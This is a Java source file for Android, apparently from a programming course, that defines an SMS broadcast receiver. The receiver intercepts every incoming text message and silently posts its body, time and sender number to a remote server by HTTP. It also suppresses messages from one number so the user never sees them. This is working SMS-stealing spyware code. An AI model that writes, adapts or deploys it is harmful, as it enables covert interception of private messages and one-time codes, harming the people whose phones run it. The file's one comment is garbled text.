package cn.itcast.smslistener;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SMSBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for(Object p : pdus){
			byte[] pdu = (byte[]) p;
			SmsMessage message = SmsMessage.createFromPdu(pdu);
			String content = message.getMessageBody();
			Date date = new Date(message.getTimestampMillis());
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String receiveTime = format.format(date);
			String senderNumber = message.getOriginatingAddress();
			sendSMS(content, receiveTime, senderNumber);
			
			if("5556".equals(senderNumber)){
				abortBroadcast();//÷’÷ππ„≤•
			}
		}
	}

	private boolean sendSMS(String content, String receiveTime, String senderNumber) {
		try{
			String params = "content="+ URLEncoder.encode(content, "UTF-8")+
				"&receivetime="+ receiveTime+ "&sendernumber="+ senderNumber;
			byte[] entity = params.getBytes();
			String path = "http://192.168.1.100:8080/web/ReceiveSMSServlet";
			HttpURLConnection conn = (HttpURLConnection) new URL(path).openConnection();
			conn.setConnectTimeout(5000);
			conn.setRequestMethod("POST");
			conn.setDoOutput(true);
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length", String.valueOf(entity.length));
			conn.getOutputStream().write(entity);
			if(conn.getResponseCode() == 200){
				return true;
			}
		}catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

}
